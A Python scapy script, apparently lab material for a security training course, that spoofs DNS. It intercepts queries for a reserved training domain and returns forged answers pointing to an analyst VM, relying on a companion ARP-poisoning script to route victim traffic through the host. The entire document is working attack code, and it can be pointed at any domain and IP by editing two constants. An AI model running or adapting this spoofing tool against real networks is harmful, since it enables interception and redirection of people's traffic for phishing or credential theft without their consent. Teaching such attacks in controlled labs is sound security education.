#!/usr/bin/env python3
"""
Authorized training DNS spoofing script — SBT-DF203 Lab 8
Intercepts DNS queries for a reserved training domain and forges a response
pointing to the analyst VM. Requires IP forwarding enabled and traffic routed
through this host (e.g. via concurrent arp.py run).
Usage: sudo python3 dns_spoof.py
"""
from scapy.all import *

TARGET_DOMAIN = "portal.icdfa.test."
SPOOF_IP = "192.168.122.83"   # Analyst VM IP — replace if different

def process_packet(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qd.qname.decode() == TARGET_DOMAIN:
        print(f"[*] Intercepted DNS query for {TARGET_DOMAIN}")
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=53) / \
                      DNS(
                          id=packet[DNS].id,
                          qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=SPOOF_IP)
                      )
        send(spoofed_pkt, verbose=False)
        print(f"[*] Sent forged response: {TARGET_DOMAIN} -> {SPOOF_IP}")

if __name__ == "__main__":
    print(f"[*] Listening for DNS queries to {TARGET_DOMAIN}...")
    print("[*] Press Ctrl+C to stop.")
    try:
        sniff(filter="udp port 53", prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
